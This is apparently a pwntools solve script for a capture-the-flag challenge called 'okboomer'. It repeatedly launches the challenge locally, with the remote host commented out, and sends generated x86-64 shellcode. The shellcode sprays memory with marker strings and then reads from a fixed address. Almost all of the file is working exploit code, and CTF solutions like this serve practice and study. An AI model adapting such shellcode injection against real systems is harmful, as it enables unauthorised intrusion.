'''
chmod +x ./chall.py
python3 solve.py 
keep trying ...
keep pressing ctrl + c to leave
'''

from pwn import *

context.arch = 'amd64'


while 1:
	r = process('./chall.py')
	#r = remote('okboomer.tasteless.eu', 10601)
	sc = ''
	for i in range(0xf000//0x30):
		target = 0x7fffffff0000 + i*0x30
		sc += 'mov rsp, {}\n'.format(target) + 'mov rsi, 0x4554534154\n' + 'mov qword ptr [rsp], rsi\n'
		sc += 'mov rsp, {}\n'.format(target+8) + 'mov rsi, 0x215353454c\n' + 'mov qword ptr [rsp], rsi\n'
		sc += 'mov rsp, {}\n'.format(target+0x10) + 'mov rsi, 0x215353454c\n' + 'mov qword ptr [rsp], rsi\n'
		sc += 'mov rsp, {}\n'.format(target+0x18) + 'mov rsi, 0x4554534154\n' + 'mov qword ptr [rsp], rsi\n'
		sc += 'mov rsp, {}\n'.format(target+0x20) + 'mov rsi, 0x215353454c\n' + 'mov qword ptr [rsp], rsi\n'
		sc += 'mov rsp, {}\n'.format(target+0x28) + 'mov rsi, 0x4554534154\n' + 'mov qword ptr [rsp], rsi\n'

	target = 0x00007ffff7ffb07f
	sc += 'mov rdi, 1\n' + 'mov rdx, 5\n' + 'mov rax, 0x7fffffff0000\n'
	sc += 'mov r15, {}\n'.format(target) + 'mov ax, word ptr [r15]\n' + 'mov rsi, rax'

	r.sendlineafter(':', sc)
	r.sendline()
	r.interactive()